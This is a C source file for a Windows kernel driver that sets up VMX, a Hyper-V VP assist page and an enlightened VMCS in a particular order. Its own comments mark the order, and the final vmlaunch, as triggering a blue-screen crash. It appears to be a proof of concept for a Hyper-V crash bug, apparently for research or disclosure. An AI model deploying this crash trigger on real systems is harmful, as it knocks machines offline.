#include "hypervbsod.h"

//
// thanks to Hypervisor from scratch project (developed by @Intel80x86) to provide some piece of driver code examples:	
// https://github.com/SinaKarvandi/Hypervisor-From-Scratch/tree/master/Part%208%20-%20How%20To%20Do%20Magic%20With%20Hypervisor!/Hypervisor%20From%20Scratch/MyHypervisorDriver
//

PVOID AllocatePageAlignedMemory(ULONG64 size)
{	
	PHYSICAL_ADDRESS PhysicalMax = { 0 };
	PVOID pBuffer = NULL;
	UINT64 AlignedBuffer;
	
	PhysicalMax.QuadPart = MAXULONG64;

	pBuffer = MmAllocateContiguousMemory(size + PAGE_SIZE, PhysicalMax); 

	if (!pBuffer)
		return NULL;

	RtlSecureZeroMemory(pBuffer, size + PAGE_SIZE);

	AlignedBuffer = (BYTE*)((ULONG_PTR)((UINT64)pBuffer + size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1));

	return (PVOID)AlignedBuffer;
}

BOOLEAN FillBuffer(PCHAR buffer, ULONG64 len, CHAR symbol)
{
	for (ULONG i = 0; i < len; i++)
	{
		buffer[i] = symbol;
	}

	return TRUE;
}

BOOLEAN HvActivateVpPages()
{
	PHYSICAL_ADDRESS physAddr;
	IA32_VMX_BASIC_MSR VmxBasicMsr = { 0 };
	int Vmxon = 0;
	PVOID pVmxon = NULL;
	PHV_VP_ASSIST_PAGE pHvVpPage = NULL;
	UINT64 physHvVpPage = 0;

	//
	// Enable VMX operations
	//

	ArchEnableVmx();

	//
	// Allocate VMXON region
	//

	pVmxon = AllocatePageAlignedMemory(PAGE_SIZE);

	if (!pVmxon)
	{
		DbgPrint("VMXON region allocation failed\n");
		return FALSE;
	}

	physAddr = MmGetPhysicalAddress(pVmxon);

	VmxBasicMsr.All = __readmsr(MSR_IA32_VMX_BASIC);

	*(UINT64*)pVmxon = VmxBasicMsr.Fields.RevisionIdentifier;

	Vmxon = __vmx_on(&physAddr.QuadPart);

	if (Vmxon)
	{
		DbgPrint("Executing Vmxon instruction failed with status : %d\n", Vmxon);
		return FALSE;
	}

	//
	// Allocate HV_VP_ASSIST_PAGE for specific processor
	//
	
	pHvVpPage = AllocatePageAlignedMemory(PAGE_SIZE);

	if (!pHvVpPage)
	{
		DbgPrint("Hyper-V VP page allocation failed\n");
		return FALSE;
	}
		
	physAddr = MmGetPhysicalAddress(pHvVpPage);
	physHvVpPage = physAddr.QuadPart;

	//
	// Set PFN of VP page and Enable it
	//

	VIRTUAL_VP_ASSIST_PAGE_PFN guestPFN = { 0 };

	guestPFN.PFN = physHvVpPage / PAGE_SIZE;
	guestPFN.Enable = 1;

	//
	// Allocate enlightened VMCS
	// 

	PHV_VMX_ENLIGHTENED_VMCS pEnlVMCS = AllocatePageAlignedMemory(PAGE_SIZE);

	if (!pEnlVMCS)
	{
		DbgPrint("Hyper-V enligthened VMCS page allocation failed\n");
		__vmx_off();
		return FALSE;
	}

	physAddr = MmGetPhysicalAddress(pEnlVMCS);
	UINT64 physHvEnlVMCS = physAddr.QuadPart;

	//
	// Configure enlightened VMCS. If we write to HV_X64_MSR_APIC_ASSIST_PAGE after configuring, we get BSOD
	//

	pHvVpPage->EnlightenVmEntry = TRUE;
	pHvVpPage->CurrentNestedVmcs = physHvEnlVMCS;

	__writemsr(HV_X64_MSR_APIC_ASSIST_PAGE, guestPFN.AsUINT64);

	//If next 2 string will be uncomment, BSOD will not be generated.

	//pHvVpPage->EnlightenVmEntry = TRUE;
	//pHvVpPage->CurrentNestedVmcs = physHvEnlVMCS;

	//
	// Prepare to vmlaunch
	//

	int Vmclear = 0;
	Vmclear = __vmx_vmclear(&physHvEnlVMCS);

	if (Vmclear)
	{
		__vmx_off();
		return FALSE;
	}

	__vmx_vmlaunch(); // BSOD

	__vmx_off();

	return TRUE;
}